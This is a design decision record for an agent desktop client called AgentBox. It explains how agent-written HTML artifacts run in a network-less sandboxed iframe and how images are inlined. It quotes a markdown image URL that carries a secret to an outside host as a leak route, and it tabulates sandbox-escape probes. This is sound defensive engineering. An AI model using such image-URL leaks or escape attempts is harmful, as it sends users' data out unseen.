# ADR-0010: interactive artifacts - a sandboxed iframe, with the libraries inside it

Status: accepted (2026-07-25)

## Context

M10's target: AgentBox renders everything the official Claude desktop client
renders and more, **including interactive HTML the agent can watch you use**,
with your clicks and inputs reaching it in real time. The wider of the two
options was taken deliberately: React and Tailwind bundled, so an artifact
written for claude.ai runs as written.

That means running agent-authored code on your desktop. The question this ADR
settles is not whether to run it - that was the ask - but what it is allowed to
touch while it runs, and how anything gets out of it.

Two things make the answer non-obvious:

- AgentBox is offline-capable by design (NFR: no network dependency at
  runtime), and every claude.ai-style artifact begins with a CDN script tag.
  Whatever we do, the libraries have to already be here.
- An artifact is a text box the human types into, sitting inside a tool whose whole
  purpose is a trusted channel between them and an agent. Markup that could POST
  what they typed to a host of its own choosing would poison that.

## Decision

An artifact runs in an **iframe with `sandbox="allow-scripts"` and no
`allow-same-origin`**, from a `srcdoc` document AgentBox assembles, under a
**Content-Security-Policy of `default-src 'none'` with no network directive of any
kind**. No CDN, no AgentBox asset server, no fetch, no websocket, no remote
image.

Because nothing can be fetched, everything the artifact needs is injected as text
into the document: **React 19 and Tailwind v4** from AgentBox's own bundle
(`frontend/tools/build-runtime.mjs` builds them into
`frontend/src/artifact/generated/`, which is committed like `frontend/dist`), plus
a **JSX/TypeScript transform** (sucrase) that runs in the surface and turns an
artifact's `import`s into lookups against those bundled modules. The chunk is
loaded on demand, so a card with a one-line question never pays for it.

The one way out is **`window.agentbox.emit(name, data)`**: the iframe posts to
the surface, the surface validates shape and size, Go validates them again, and
the daemon hands the event to whichever agent is waiting
(`await_artifact_event`) or buffers it, coalesced per control, for the next
`read_artifact_events`.

`'unsafe-inline'` and `'unsafe-eval'` are in that policy on purpose. The document
*is* agent code; refusing it eval would not make it less able to run what it
already contains, and would break libraries that compile a template at runtime.
What the policy is for is the network, and the network is closed.

Two decisions of taste came with it. Every artifact has a **code/preview toggle**,
because reading what an agent wants to run is part of trusting it. And
**`[artifact] enabled`** is a trust switch enforced where the iframe would be
created, so "off" means nothing runs rather than something runs invisibly.

## What this is not

It is not a restriction on the agent, and reading it that way inverts it. The
sandbox binds the *markup*: an artifact cannot act on its own or report anywhere.
Everything it wants done travels through the door to an agent that has exactly the
tools and permissions it always had, so a slider the human drags can end in a
migration - it just cannot end in a request the human never saw.

## The same question, asked of an image (M10 slice 4)

Artifacts were the loud version of this decision. Images were the quiet one,
and AgentBox got it wrong until slice 4. Raw HTML never reaches a surface, so
an `<img>` cannot be hand-written - but `![alt](https://host/p.gif?d=secret)`
is ordinary markdown, and goldmark's own renderer turned it into a live remote
`<img src>`. Rendering an agent's prose therefore made a request, to a host the
human never saw, with whatever the agent chose to put in the path. No sandbox
was involved, because nothing looked like it needed one.

The answer is the same principle applied to bytes instead of scripts, and lives
in `internal/webui/images.go`:

- Go reads the file and inlines it as a `data:` URI. The surface receives bytes
  and never learns a path, so it never learns how to open one.
- The path must be absolute (`~` counts) unless the render was handed a base
  directory, which happens only for a document AgentBox opened from disk
  (`agentbox show FILE`, the watch loop): there the file's own directory is an
  honest base and `![](out/chart.png)` resolves against it. Agent prose over
  the socket gets none. Resolving is a naming convenience and not a widening of
  reach - the joined path faces the same stat, sniff and ceiling as one written
  out in full, and an agent could always write the absolute path itself.
- The bytes must be a PNG, JPEG, GIF or WebP by magic number, not by extension -
  the extension is both the part an agent most often gets wrong and the part an
  attacker would choose. SVG is out: a vector picture from an agent is a `chart`
  or `mermaid` fence AgentBox draws itself.
- 2 MB, checked against the file size before a read. Cached by (path, mtime,
  size), because a streaming turn re-renders every turn it holds ~16 times a
  second.
- Anything else renders as a placeholder saying why, keeping the alt text, with
  the destination in a `title` attribute and nowhere a sentence would read it.

`frontend/index.html` carries `img-src 'self' data: blob:` with no other
directive, so this restricts images and nothing else. It is the second lock on
the same door: a future edit to images.go that emitted a remote src still would
not load. Verified live - the img-src policy does not disturb artifact
hydration, since an artifact's own CSP is already `img-src data: blob:`.

**Both policies are now tests** (sixteenth session), which is what makes the
paragraphs above claims rather than intentions. `frontend/policy_test.go` asserts
them against `dist` - the bytes `go:embed` puts in the binary, not the working
tree, because a source-only check would pass while the shipped bundle carried
something else: the image policy ships and names no host, it still matches its
source (a stale bundle is a failure that says to rebuild), the artifact CSP
survives with every directive that closes a way out, `allow-scripts` is set and
`allow-same-origin` appears nowhere in the bundle. The same file pins the rule
this whole ADR rests on: **every `{@html}` in the surfaces is an allowlist entry
naming the Go field behind it**, so injecting an agent's own text is a test
failure rather than a review miss. `internal/webui/policy_test.go` states the
matching invariant on Go's side over every surface at once. Neither runs any
JavaScript - a policy is a constant, and executing `buildDocument` would need a JS
test runner and a DOM (see docs/STATUS.md).

## Consequences

- An artifact written for claude.ai runs: imports react, JSX, utility classes,
  `export default`. One thing does not, and cannot: any other npm package. A
  missing module is named in the artifact's own bar (`agentbox does not bundle
  "recharts"`) rather than failing three frames deep.
- The repository carries ~466 kB of generated vendor text (React 190 kB, Tailwind
  276 kB) and the artifact chunk is 685 kB minified. That is the price of offline,
  and it is lazily loaded.
- An artifact cannot persist anything (no storage in an opaque origin) or open a
  window. State lives in the agent, which is where AgentBox's audit trail is.
- Artifact events do not enter the item queue or the store. A slider drag is not
  an interruption, and counting it as one would put forty rows in the inbox for one
  gesture and tell the stats surface the human was interrupted forty times. The
  event log is the audit trail: one line per event, wait and timeout.

## Alternatives rejected

- **A CDN, as claude.ai does.** Breaks offline, and puts a network path inside the
  one component that must not have one.
- **Serving the runtime from AgentBox's own asset server** and allowing that
  host in `script-src`. Cheaper (one cached copy for every artifact instead of
  ~466 kB per document) but it makes "no network at all" untrue, and a policy
  you have to qualify is a policy nobody can check. Revisit only if document
  assembly becomes a measured problem.
- **An import map instead of globals.** A single import map must be in place before
  the first module loads, which is awkward to guarantee inside a document we are
  splicing; rewriting imports to lookups covers both shapes AgentBox has to run
  (a module that imports react, and a document that expects `window.React`
  from a CDN tag) with one mechanism.
- **No `allow-same-origin` but a shared origin via the asset server.** Sandbox
  without `allow-same-origin` already gives an opaque origin, so this buys nothing
  and reads as if the artifact were trusted.
- **Rendering artifact HTML directly in the surface.** Considered for about as long
  as it took to say out loud: it would give agent markup the run of the window that
  holds the human's answers.

## Validation (2026-07-25, through the real daemon)

`tools/artifact-probe.html` is an artifact that tries to escape its own sandbox and
reports what happened, so this table is reproducible rather than historical:

```
agentbox daemon &
agentbox show --artifact tools/artifact-probe.html
```

Run in the reader on Ubuntu 24.04 / GNOME / X11 / GTK 4.14.5 / WebKitGTK 2.52.3:

| Attempt | Result |
|---|---|
| `parent.document` | blocked: SecurityError |
| `parent.location.href` | blocked: SecurityError |
| `location.origin` | `null` (opaque origin) |
| `document.cookie` | empty |
| `localStorage.setItem` | blocked: SecurityError |
| `window.open` | `null` |
| `fetch` | blocked: Load failed |
| `XMLHttpRequest` | blocked |
| `new WebSocket` | blocked: the operation is insecure |
| remote `<img>` | blocked |
| remote `<script src>` | blocked |
| `window.agentbox.emit` | available |
| `window.React` when not asked for | absent |

And the channel, end to end: a click in a sandboxed React artifact came out of
`agentbox artifact wait --id <id>` as `run {"rows":500,"dryRun":false}` with
exit 0 (`artifact.event ... waiting_agent=true` in the log); three slider moves
with no agent waiting read back as one coalesced `batch {"rows":1600}`. Flipping
`[artifact] enabled` to false removed a frame that was running at the time and
left its source; flipping it back started it again.

## Sources

- MDN, iframe `sandbox` and opaque origins; CSP `default-src`.
- `@tailwindcss/browser` 4.3.3 ships a prebuilt in-page compiler with no network
  calls (verified by inspection: no `fetch`, no `XMLHttpRequest`).
- React 19 ships no UMD build, hence AgentBox's own IIFE.
